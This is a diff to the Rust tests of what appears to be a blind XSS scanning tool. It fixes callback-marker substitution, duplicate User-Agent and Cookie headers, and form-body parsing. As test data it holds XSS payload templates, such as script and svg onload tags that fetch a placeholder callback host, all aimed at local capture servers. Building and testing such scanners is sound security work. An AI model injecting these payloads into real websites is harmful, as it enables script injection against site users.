@@ -18,6 +18,9 @@ struct CapturedRequest {
     method: String,
     uri: String,
     headers: HashMap<String, String>,
+    /// Every value per (lowercased) name, in wire order. `headers` keeps only
+    /// the last one, which hides a duplicated header.
+    header_values: HashMap<String, Vec<String>>,
     body: String,
 }
 
@@ -30,17 +33,22 @@ async fn capture_handler(
     let (parts, body) = request.into_parts();
     let bytes = to_bytes(body, usize::MAX).await.unwrap_or_default();
     let mut headers = HashMap::new();
+    let mut header_values: HashMap<String, Vec<String>> = HashMap::new();
     for (name, value) in &parts.headers {
-        headers.insert(
-            name.as_str().to_ascii_lowercase(),
-            value.to_str().unwrap_or_default().to_string(),
-        );
+        let name = name.as_str().to_ascii_lowercase();
+        let value = value.to_str().unwrap_or_default().to_string();
+        header_values
+            .entry(name.clone())
+            .or_default()
+            .push(value.clone());
+        headers.insert(name, value);
     }
 
     state.lock().await.push(CapturedRequest {
         method: parts.method.to_string(),
         uri: parts.uri.to_string(),
         headers,
+        header_values,
         body: String::from_utf8_lossy(&bytes).to_string(),
     });
     StatusCode::OK
@@ -463,16 +471,6 @@ fn location_of_maps_param_types_to_wire_locations() {
     assert_eq!(location_of("unknown"), "");
 }
 
-#[test]
-fn build_cookie_header_joins_pairs_or_returns_none() {
-    assert_eq!(build_cookie_header(&[]), None);
-    let cookies = vec![
-        ("a".to_string(), "1".to_string()),
-        ("b".to_string(), "2".to_string()),
-    ];
-    assert_eq!(build_cookie_header(&cookies).as_deref(), Some("a=1; b=2"));
-}
-
 fn injectable(html: &str, selector: &str) -> bool {
     let frag = scraper::Html::parse_fragment(html);
     let sel = scraper::Selector::parse(selector).expect("valid selector");
@@ -506,7 +504,7 @@ fn build_send_payloads_static_substitutes_callback_url() {
     let source = CallbackSource::Static("https://cb.example/hook");
     let out = build_send_payloads(
         &source,
-        "\"'><script src={}></script>",
+        "\"'><script src={callback}></script>",
         "https://target.example/",
         "q",
         "Query",
@@ -521,8 +519,8 @@ fn build_blind_templates_falls_back_to_builtin_without_path() {
     let templates = build_blind_templates(None);
     assert!(!templates.is_empty());
     assert!(
-        templates.iter().all(|t| t.contains("{}")),
-        "every built-in template keeps the normalized callback marker"
+        templates.iter().all(|t| t.contains(CALLBACK_MARKER)),
+        "every built-in template carries the callback marker"
     );
     // The whole catalog reaches the wire — not just the first entry, which was
     // the prior behaviour that left the other shapes defined-but-unsent.
@@ -564,9 +562,8 @@ fn build_blind_templates_reads_custom_lines_and_normalizes_marker() {
     let templates = build_blind_templates(Some(p.to_str().unwrap()));
     let _ = std::fs::remove_file(&p);
     assert_eq!(templates.len(), 2, "comments and blank lines are dropped");
-    assert_eq!(templates[0], "<img src={}>");
-    assert!(templates[1].contains("{}"));
-    assert!(templates.iter().all(|t| !t.contains("{callback}")));
+    assert_eq!(templates[0], "<img src={callback}>");
+    assert_eq!(templates[1], "<svg onload=fetch('{callback}')>");
 }
 
 #[test]
@@ -575,7 +572,7 @@ fn build_blind_templates_drops_lines_without_callback_marker() {
     let p = tmp_template_file("mixed", "<img src=x>\n<b>{callback}</b>\n");
     let templates = build_blind_templates(Some(p.to_str().unwrap()));
     let _ = std::fs::remove_file(&p);
-    assert_eq!(templates, vec!["<b>{}</b>".to_string()]);
+    assert_eq!(templates, vec!["<b>{callback}</b>".to_string()]);
 }
 
 #[test]
@@ -583,9 +580,9 @@ fn build_blind_templates_falls_back_when_no_usable_lines() {
     let p = tmp_template_file("nouse", "no placeholder here\nanother bad line\n");
     let templates = build_blind_templates(Some(p.to_str().unwrap()));
     let _ = std::fs::remove_file(&p);
-    // No usable line → built-in fallback (which carries the {} marker).
+    // No usable line → built-in fallback (which carries the marker).
     assert!(!templates.is_empty());
-    assert!(templates.iter().all(|t| t.contains("{}")));
+    assert!(templates.iter().all(|t| t.contains(CALLBACK_MARKER)));
 }
 
 #[test]
@@ -595,7 +592,7 @@ fn build_blind_templates_falls_back_when_file_unreadable() {
         !templates.is_empty(),
         "unreadable path falls back to built-in"
     );
-    assert!(templates.iter().all(|t| t.contains("{}")));
+    assert!(templates.iter().all(|t| t.contains(CALLBACK_MARKER)));
 }
 
 /// `Some("")` is the "no UA override" sentinel every entry point sets when the
@@ -619,4 +616,190 @@ async fn test_send_blind_request_omits_user_agent_for_the_no_override_sentinel()
         ua != Some(""),
         "the empty sentinel must not become a blank User-Agent header; saw {ua:?}"
     );
+}
+
+/// A custom template's own `{}` (an empty JS function body or object literal)
+/// is not the callback marker: only `{callback}` is substituted. Normalizing
+/// `{callback}` to the built-in `{}` used to replace both, so
+/// `.catch(()=>{})` became `.catch(()=>https://…)` — a syntax error, and a
+/// blind probe that could never call home.
+#[test]
+fn custom_template_literal_braces_survive_callback_substitution() {
+    let p = tmp_template_file(
+        "braces",
+        "<script>fetch('{callback}').catch(()=>{})</script>\n",
+    );
+    let templates = build_blind_templates(Some(p.to_str().unwrap()));
+    let _ = std::fs::remove_file(&p);
+    assert_eq!(templates.len(), 1);
+
+    let out = build_send_payloads(
+        &CallbackSource::Static("https://cb.example/hook"),
+        &templates[0],
+        "https://target.example/",
+        "q",
+        "Query",
+        "GET",
+    );
+    assert_eq!(
+        out,
+        vec!["<script>fetch('https://cb.example/hook').catch(()=>{})</script>".to_string()]
+    );
+}
+
+/// `--user-agent X` puts `User-Agent: X` in `target.headers` *and* sets
+/// `target.user_agent`. Injecting the blind payload into that header must put
+/// the payload on the wire as the only User-Agent — not the payload followed by
+/// a second `User-Agent: X`, which a server reading the last value logs instead.
+#[tokio::test]
+async fn test_send_blind_request_user_agent_injection_is_the_only_user_agent() {
+    let (addr, state) = start_capture_server().await;
+    let mut target = make_target(addr, "/");
+    target.headers = vec![("User-Agent".to_string(), "X-Agent".to_string())];
+    target.user_agent = Some("X-Agent".to_string());
+
+    send_blind_request(&target, "User-Agent", "UAPAY", "header").await;
+    send_blind_request(&target, "q", "QPAY", "query").await;
+
+    let records = state.lock().await.clone();
+    assert_eq!(records.len(), 2);
+    assert_eq!(
+        records[0].header_values.get("user-agent"),
+        Some(&vec!["UAPAY".to_string()]),
+        "header injection must replace the User-Agent, not add a second one"
+    );
+    assert_eq!(
+        records[1].header_values.get("user-agent"),
+        Some(&vec!["X-Agent".to_string()]),
+        "a non-header injection must send the configured User-Agent once"
+    );
+}
+
+/// A `-H "Cookie: …"` header wins over `--cookies`, as on every other request
+/// path; the blind requests used to send both as two Cookie headers.
+#[tokio::test]
+async fn test_send_blind_request_sends_a_single_cookie_header() {
+    let (addr, state) = start_capture_server().await;
+    let mut target = make_target(addr, "/");
+    target.headers = vec![("Cookie".to_string(), "sid=hdr".to_string())];
+    target.cookies = vec![("theme".to_string(), "dark".to_string())];
+
+    send_blind_request(&target, "q", "QPAY", "query").await;
+    send_blind_request(&target, "theme", "CKPAY", "cookie").await;
+
+    let records = state.lock().await.clone();
+    assert_eq!(records.len(), 2);
+    for r in &records {
+        assert_eq!(
+            r.header_values.get("cookie").map(Vec::len),
+            Some(1),
+            "exactly one Cookie header expected, got {:?}",
+            r.header_values.get("cookie")
+        );
+    }
+    assert!(records[1].headers["cookie"].starts_with("theme=CKPAY"));
+}
+
+/// Body names are matched after form-decoding, so a percent-encoded or
+/// `+`-spaced name must be collected decoded too: the raw spelling never
+/// matched, the real field went untouched, and a double-encoded
+/// `user%255Bname%255D` field was appended instead.
+#[tokio::test]
+async fn test_blind_scanning_injects_percent_encoded_body_names_in_place() {
+    let (addr, state) = start_capture_server().await;
+    let mut target = make_target(addr, "/submit");
+    target.method = "POST".to_string();
+    target.data = Some("user%5Bname%5D=alice&first+name=bob".to_string());
+
+    blind_scanning(&target, "https://cb.example/hook", None).await;
+
+    let records = state.lock().await.clone();
+    let bodies: Vec<&str> = records.iter().map(|r| r.body.as_str()).collect();
+    assert!(
+        bodies.iter().all(|b| !b.contains("%255B")),
+        "no double-encoded field may be appended; got {bodies:?}"
+    );
+    assert!(
+        bodies.iter().any(|b| b.starts_with("user%5Bname%5D=")
+            && b.contains("cb.example")
+            && b.ends_with("&first+name=bob")),
+        "the bracketed field must carry the payload in place; got {bodies:?}"
+    );
+    assert!(
+        bodies
+            .iter()
+            .any(|b| b.starts_with("user%5Bname%5D=alice&first+name=") && b.contains("cb.example")),
+        "the `+`-spaced field must carry the payload in place; got {bodies:?}"
+    );
+}
+
+/// The form-page fetch goes through the shared builder, which drops a caller
+/// `Accept-Encoding` (a hand-set one disables reqwest's decompression and the
+/// form page comes back as bytes no parser finds a form in).
+#[tokio::test]
+async fn test_blind_scan_forms_fetch_does_not_forward_accept_encoding() {
+    let state: CaptureState = Arc::new(Mutex::new(Vec::new()));
+    let app = Router::new()
+        .route("/", any(capture_handler))
+        .with_state(state.clone());
+    let listener = tokio::net::TcpListener::bind((Ipv4Addr::LOCALHOST, 0))
+        .await
+        .expect("bind listener");
+    let addr = listener.local_addr().expect("listener addr");
+    tokio::spawn(async move {
+        let _ = axum::serve(listener, app).await;
+    });
+    sleep(Duration::from_millis(30)).await;
+
+    let mut target = make_target(addr, "/");
+    target.headers = vec![("Accept-Encoding".to_string(), "x-caller".to_string())];
+
+    blind_scan_forms(&target, "https://cb.example", None).await;
+
+    let records = state.lock().await.clone();
+    assert_eq!(records.len(), 1, "one GET for the form page");
+    assert!(
+        records[0]
+            .header_values
+            .get("accept-encoding")
+            .is_none_or(|v| v.iter().all(|x| x != "x-caller")),
+        "caller Accept-Encoding must not reach the form fetch: {:?}",
+        records[0].header_values.get("accept-encoding")
+    );
+}
+
+#[test]
+fn looks_like_urlencoded_form_rejects_structured_bodies() {
+    assert!(looks_like_urlencoded_form("a=1&b=2"));
+    assert!(looks_like_urlencoded_form("user%5Bname%5D=x"));
+    // JSON / GraphQL / XML are not forms, even with an `=` inside a value.
+    assert!(!looks_like_urlencoded_form(r#"{"next":"/a?x=1"}"#));
+    assert!(!looks_like_urlencoded_form("  [\"a=b\"]"));
+    assert!(!looks_like_urlencoded_form("<q>a=b</q>"));
+    // No `=` at all: nothing to enumerate.
+    assert!(!looks_like_urlencoded_form("opaquetoken"));
+}
+
+/// A JSON body must not be split on `&`/`=` into a garbage field: that invented
+/// a bogus param name and re-serialized the request into a corrupt form.
+#[tokio::test]
+async fn test_blind_scanning_skips_a_json_body() {
+    let (addr, state) = start_capture_server().await;
+    let mut target = make_target(addr, "/submit");
+    target.method = "POST".to_string();
+    target.data = Some(r#"{"next":"/a?x=1"}"#.to_string());
+
+    blind_scanning(&target, "https://cb.example/hook", None).await;
+
+    let records = state.lock().await.clone();
+    // Query has no params and the JSON body yields none, so no body-injection
+    // requests go out; any request that did must still carry the JSON verbatim,
+    // never a re-serialized `{"next"...=...` form field.
+    for r in &records {
+        assert!(
+            !r.body.contains("%7B%22next%22"),
+            "JSON body was re-serialized as a form field: {}",
+            r.body
+        );
+    }
 }
